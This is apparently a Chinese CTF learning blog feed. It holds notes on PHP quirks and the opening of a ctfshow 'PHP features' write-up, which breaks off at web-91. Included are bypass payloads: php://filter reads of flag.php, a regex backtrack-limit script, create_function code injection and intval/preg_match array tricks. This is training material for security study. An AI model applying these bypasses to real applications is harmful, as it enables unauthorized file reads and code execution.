class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Object name:&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myclass</span>(<span class="hljs-string">&quot;My Object&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>; <span class="hljs-comment">// 输出对象的字符串表示，自动调用__toString()方法</span><br><span class="hljs-meta">?&gt;</span><br><br>输出<br>Object name:My Object<br></code></pre></td></tr></table></figure><p><strong>php中，自带 <code>__toString()</code>方法的内置类有：<code>DataTime</code>、<code>Exception</code>、<code>SimpleXMLElement</code>。</strong></p><hr><h3 id="php超全局变量"><a href="#php超全局变量" class="headerlink" title="php超全局变量"></a>php超全局变量</h3><p><a href="https://www.runoob.com/php/php-superglobals.html">php超级全局变量详解</a></p><hr><h3 id="php伪协议（filter）"><a href="#php伪协议（filter）" class="headerlink" title="php伪协议（filter）"></a>php伪协议（filter）</h3><p>php:&#x2F;&#x2F;filter是php中的伪协议主要用于在输入和输出流上应用过滤器。基本语法是：php:&#x2F;&#x2F;filter&#x2F;<filter>&#x2F;resource，其中<filter>是要应用的过滤器名称，resource是要过滤的资源。</filter></filter></p><pre><code>过滤读取的数据//先读取flag.php的内容，再进行base64编码，也就是说以后呈现的内容是经过base64编码后的内容。file_get_contents(&#39;php://filter/write=convert.base64-encode/resource=flag.php&#39;） 过滤写入的数据// 先将字符串hello world进行base64编码，再写入flag.php文件中，写的时候是先进行base64解码，再写。也就是说在写的时候，先执行php://filter/write=convert.base64-decode对字符串进行解码。$data=&#39;hello world&#39;;file_put_contents(&#39;php://filter/write=convert.base64-decode/resource=flag.php&#39;，base64($data))</code></pre><hr><h3 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">语法<br>trim(string,charlist)<br><br>参数描述<br>string        必需<span class="hljs-operator">。</span>规定要检查的字符串<span class="hljs-operator">。</span><br>charlist    可选<span class="hljs-operator">。</span>规定从字符串中删除哪些字符<span class="hljs-operator">。</span>如果省略该参数，则移除下列所有字符：<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\0</span>&quot;</span>       <span class="hljs-operator">-</span> <span class="hljs-type">NULL</span><br>                <span class="hljs-string">&quot;<span class="hljs-subst">\t</span>&quot;</span>       <span class="hljs-operator">-</span> 制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>       <span class="hljs-operator">-</span> 换行<br>                <span class="hljs-string">&quot;\x0B&quot;</span>     <span class="hljs-operator">-</span> 垂直制表符<br>                <span class="hljs-string">&quot;<span class="hljs-subst">\r</span>&quot;</span>       <span class="hljs-operator">-</span> 回车<br>                <span class="hljs-string">&quot; &quot;</span>        <span class="hljs-operator">-</span> 空格<br></code></pre></td></tr></table></figure><hr><h3 id="GET-POST传递变量特性（-）"><a href="#GET-POST传递变量特性（-）" class="headerlink" title="GET&#x2F;POST传递变量特性（[）"></a>GET&#x2F;POST传递变量特性（[）</h3><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、[，+、点转换为下划线，而传入[之后后面的空格、[，+、点就不会被转为下划线了</p><hr><h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER[]"></a>$_SERVER[]</h3><p><strong>$_SERVER[‘argv’]：传递给脚本的参数数组。</strong></p><p><strong>命令行情况下，$_SERVER[‘argv’][0]第一个元素是脚本的文件名（test.php），之后的元素是传递给脚本的参数（test1、test2）<br>在这里插入图片描述<br>web网页模式下，$arg只接受GET传参，且必须在php.ini开启register_argc_argv配置项。$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’] &#x3D; GET传参的值（?后面的），关于$_SERVER[‘QUERY_STRING’]</strong></p><hr><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p><strong>相当于eval()，也是危险函数，他能将其中的字符串当做php代码来执行，且assert不需要严格遵从语法，比如末尾的分号可以不加。</strong></p><hr><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>PHP extract()函数从<a href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84/0?fromModule=lemma_inlink">数组</a>中把<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F/0?fromModule=lemma_inlink">变量</a>导入到当前的<a href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E8%A1%A8/0?fromModule=lemma_inlink">符号表</a>中。 </p><p>对于数组中的每个元素，键名用于变量名，键值用于<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F%E5%80%BC/8414141?fromModule=lemma_inlink">变量值</a>。</p><p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract()函数如何对待这样的冲突。</p><p>本函数返回成功设置的变量数目。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-keyword">array</span>,extract_rules,prefix)<br><br>例子<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>&quot;</span>;<span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-variable">$a</span> = Cat; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse<br></code></pre></td></tr></table></figure><hr><h3 id="SERVER-‘QUERY-STRING’"><a href="#SERVER-‘QUERY-STRING’" class="headerlink" title="$_SERVER[‘QUERY_STRING’]"></a>$_SERVER[‘QUERY_STRING’]</h3><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">https://blog.csdn.net/qq_49480008/article/details/115872899</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是GET传参数据（<code>?</code>后面的键值）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">例如：<br>?<span class="hljs-attribute">ctf_show</span>=123<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>echo <span class="hljs-variable">$a</span>;<br><br>输出<br><span class="hljs-string">&#x27;ctf_show=123&#x27;</span><br></code></pre></td></tr></table></figure><hr><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p><strong>_() 函数即 gettext() 函数，可以将参数翻译成指定语言，一般就是原封不动的输出参数</strong></p><p><strong>string gettext( string $message) 返回输入的字符</strong><br><strong>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展，_是gettext的别名。需要php扩展目录下有php_gettext.dll</strong></p><p><strong>echo gettext(“Welcome to My PHP Application”);</strong></p><hr><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><strong>get_defined_vars — 返回由所有已定义变量所组成的数组</strong></p><hr><h3 id="stripos"><a href="#stripos" class="headerlink" title="stripos()"></a>stripos()</h3><p>stripos</p><p>注意：如果参数为数组，直接输出null</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">stripos</span> </span><br><span class="hljs-function"><span class="hljs-params">(PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">stripos</span> — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="hljs-function">说明 </span><br><span class="hljs-function"><span class="hljs-title">mixed</span> <span class="hljs-title">stripos</span><span class="hljs-params">( string <span class="hljs-string">$h</span>aystack, string <span class="hljs-string">$n</span>eedle[, int <span class="hljs-string">$o</span>ffset = <span class="hljs-number">0</span>] )</span></span><br><span class="hljs-function">返回在字符串 <span class="hljs-title">haystack</span> 中 <span class="hljs-title">needle</span> 首次出现的数字位置。 </span><br><span class="hljs-function">与 <span class="hljs-title">strpos</span><span class="hljs-params">()</span> 不同，<span class="hljs-title">stripos</span><span class="hljs-params">()</span> 不区分大小写。 </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">参数 </span><br><span class="hljs-function"><span class="hljs-title">haystack</span></span><br><span class="hljs-function">在该字符串中查找。 </span><br><span class="hljs-function"><span class="hljs-title">needle</span></span><br><span class="hljs-function">注意 <span class="hljs-title">needle</span> 可以是一个单字符或者多字符的字符串。 </span><br><span class="hljs-function">如果 <span class="hljs-title">needle</span> 不是一个字符串，那么它将被转换为整型并被视为字符顺序值。 </span><br><span class="hljs-function"><span class="hljs-title">offset</span></span><br><span class="hljs-function">可选的 <span class="hljs-title">offset</span> 参数，从字符此数量的开始位置进行搜索。如果是负数，就从字符末尾此数量的字符数开始统计。 </span><br><span class="hljs-function"></span><br><span class="hljs-function">返回值 </span><br><span class="hljs-function">返回 <span class="hljs-title">needle</span> 存在于 <span class="hljs-title">haystack</span> 字符串开始的位置<span class="hljs-params">(独立于偏移量)</span>。同时注意字符串位置起始于 0，而不是 1。 </span><br><span class="hljs-function">如果未发现 <span class="hljs-title">needle</span> 将返回 FALSE。 </span><br></code></pre></td></tr></table></figure><hr><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h3><p>readfile</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$use_include_path</span> = <span class="hljs-literal">false</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">int</span><br> 读取文件并写入到输出缓冲。 <br> <br>参数<br>filename<br>    要读取的文件名。<br>use_include_path<br>    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 <span class="hljs-literal">true</span>。<br>context<br>    Stream 上下文（context） resource。<br>返回值<br>成功时返回从文件中读入的字节数， 或者在失败时返回 <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><hr><h3 id="php伪协议嵌套无效协议"><a href="#php伪协议嵌套无效协议" class="headerlink" title="php伪协议嵌套无效协议"></a>php伪协议嵌套无效协议</h3><p>php伪协议在遇到无效协议时，会自动忽略。</p><p>当我们的伪协议中需要包含一些内容，但又不影响我们的读取，就可以使用这种方法</p><p>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode|ctfshow/</span>resource=flag.php<br>?f=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/|ctfshow/</span>resource=flag.php<br></code></pre></td></tr></table></figure><hr><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p><a href="https://www.cnblogs.com/milantgh/p/3756726.html">目录穿越详解</a></p><hr><h3 id="PCRE回溯次数绕过"><a href="#PCRE回溯次数绕过" class="headerlink" title="PCRE回溯次数绕过"></a>PCRE回溯次数绕过</h3><p>1.正则最大回溯次数绕过<br> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=&#123;<span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span>*<span class="hljs-number">250000</span>+<span class="hljs-string">&#x27;ctfshow&#x27;</span> &#125; r=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><hr><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p><strong><code>exec(string $command, array &amp;$output = ?, int &amp;$return_var = ?): string</code></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>() 执行 command 参数所指定的命令。<br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="tee（linux）"><a href="#tee（linux）" class="headerlink" title="tee（linux）"></a>tee（linux）</h3><p>tee命令是Linux中常用的命令。这是一个简单但功能强大的命令，用于读取标准输入，然后将其写入文件以及标准输出。</p><p>下是 tee 命令的一些最常用选项 -</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">-a, --<span class="hljs-built_in">append</span><br></code></pre></td></tr></table></figure><p>此选项将标准输入附加到指定文件的末尾而不是覆盖它们。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>i, <span class="hljs-comment">--ignore-interrupts</span><br></code></pre></td></tr></table></figure><p>该选项忽略中断信号（如Ctrl+C）并继续运行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">-</span>p, <span class="hljs-comment">--output-error</span><br></code></pre></td></tr></table></figure><p>此选项可防止 tee 命令因写入错误而退出。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">--<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的帮助消息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p>此选项显示 tee 命令的版本号。</p><p><strong>常用功能：</strong></p><p><strong>将标准输入写入文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world!&quot;</span> | <span class="hljs-built_in">tee</span> hello.txt</span><br><br>这里是将语句写入到文件中<br></code></pre></td></tr></table></figure><p><strong>将标准输入附加到文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello,world again!&quot;</span> | <span class="hljs-built_in">tee</span> -a hello.txt</span><br><br>将语句追加到文件中<br></code></pre></td></tr></table></figure><hr><h3 id="类的静态方法的调用"><a href="#类的静态方法的调用" class="headerlink" title="类的静态方法的调用"></a>类的静态方法的调用</h3><p><strong>语法：类+::+方法名</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">-&gt;与::调用函数的区别：<br>-&gt; 调用实例方法<br>:: 调用静态方法<br>在类里面的时候，<span class="hljs-variable">$this</span>-&gt;func()和self::func()没什么区别。<br>在外部的时候，-&gt;必须是实例化后的对象使用；而::可以是未实例化的类名直接调用。<br></code></pre></td></tr></table></figure><hr><h3 id="strripos"><a href="#strripos" class="headerlink" title="strripos()"></a>strripos()</h3><p><strong>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>): <span class="hljs-keyword">int</span><br>以不区分大小写的方式查找指定字符串在目标字符串中最后一次出现的位置。与 <span class="hljs-title function_ invoke__">strrpos</span>() 不同，<span class="hljs-title function_ invoke__">strripos</span>() 不区分大小写。 <br><br>haystack<br>    在此字符串中进行查找。<br>needle<br>    注意 needle 可以是一个单字符或者多字符的字符串。<br>offset<br>    参数 offset 可以被指定来查找字符串中任意长度的子字符串。<br>    负数偏移量将使得查找从字符串的起始位置开始，到 offset 位置为止。<br>   <br>返回 needle 相对于 haystack 字符串的位置(和搜索的方向和偏移量无关)。同时注意字符串的起始位置为<span class="hljs-number">0</span>而非<span class="hljs-number">1</span>。<br>如果 needle 未被发现，返回 <span class="hljs-literal">false</span>。 <br></code></pre></td></tr></table></figure><hr><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><p>yu22x的关于绕过正则表达式的文章：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字命令执行绕过正则总结包括各种绕过脚本</a></p><hr><h3 id="create-function（）"><a href="#create-function（）" class="headerlink" title="create_function（）"></a>create_function（）</h3><p>create_function()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br><br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br><br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> php特性 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-php特性</title>
      <link href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"/>
      <url>/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web-php特性"><a href="#web-php特性" class="headerlink" title="web-php特性"></a>web-php特性</h1><h2 id="web-89（preg-match、intval）"><a href="#web-89（preg-match、intval）" class="headerlink" title="web-89（preg_match、intval）"></a>web-89（preg_match、intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p><strong>两步，绕过正则，且intval不为0。</strong></p><p><strong>所以可以采取传入数组的方式绕过：</strong></p><p><strong>preg_match()只能处理字符串，如果处理数组会返回false；intval如果传入数组，会返回1</strong></p><p>payload:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">?<span class="hljs-built_in">num</span>[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match函数用法</a>，<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式语法</a>。</p><p><code>preg_match()</code>：执行正则表达式，进行字符串过滤。。<code>[0-9]</code>匹配0-9之间的所有字符。<code>/</code>相当于一个分隔符，<code>/../</code>之间的内容就是正则的语法。绕过方法：变量num为人工分配 ID 键的数值型数组，<code>preg_match()</code>就会失效。如<code>num[]=1,num[0]=1</code></p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数用法</a></p><p><strong><code>intval()</code>：将变量的值默认转化为十进制。绕过方法：可以使用&#x3D;&#x3D;的特性，如+16、16.0；或者进制转换后，左右变量也相等。</strong>   </p><p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p><p><strong>参数说明：</strong><br>    <strong>$var：要转换成 integer 的数量值。</strong><br>    <strong>$base：转化所使用的进制。</strong><br><strong>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</strong><br>    <strong>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</strong><br>    <strong>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</strong><br>    <strong>将使用 10 进制 (decimal)。</strong></p><ol><li><strong>使用array()类型的数组，<code>intval</code>遇到空数组为0，非空数组为1.</strong></li><li><strong>使用人工分配 ID 键的数值型数组，<code>intval</code>遇到空数组为0，非空数组为1。</strong></li></ol><hr><h2 id="web-90（intval）"><a href="#web-90（intval）" class="headerlink" title="web-90（intval）"></a>web-90（intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><ol><li><strong>intval处理开头是数字的字符串时，返回值为开头的数</strong></li><li><strong>intval() int 函数如果base为0，则var中存在字母的话遇到字母就停止读取，但遇到e，会表示科学计数法</strong></li><li><strong>intval如果base是0，会通过检测 var 的格式来决定使用的进制，所以这里也可以使用进制绕过</strong></li></ol><p>​*<strong>if(intval($num,0)&#x3D;&#x3D;&#x3D;4476){<br>​         <em>echo $flag;</em><br>​<strong><strong><strong>这句话是base&#x3D;0,所以会对num的格式进行检测，相当于个解密</strong></strong><br>​直接使用4476的16进制编码传上去</strong></strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=4476a<br>?<span class="hljs-attribute">num</span>=4476e1<br>?<span class="hljs-attribute">num</span>=0x117c<br></code></pre></td></tr></table></figure><hr><h3 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h3><p>在php中，三个等号“&#x3D;&#x3D;&#x3D;”是全等比较运算符，用于比较两个操作数的值是否相等，同时检测它们的类型</p><p>是否相同；只有两边的值和数据类型都相等时，运算结果才是TRUE。可以使用<strong>进制转换</strong>进行绕过</p><hr><h2 id="web-91（正则匹配多行模式）"><a href="#web-91（正则匹配多行模式）" class="headerlink" title="web-91（正则匹配多行模式）"></a>web-91（正则匹配多行模式）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 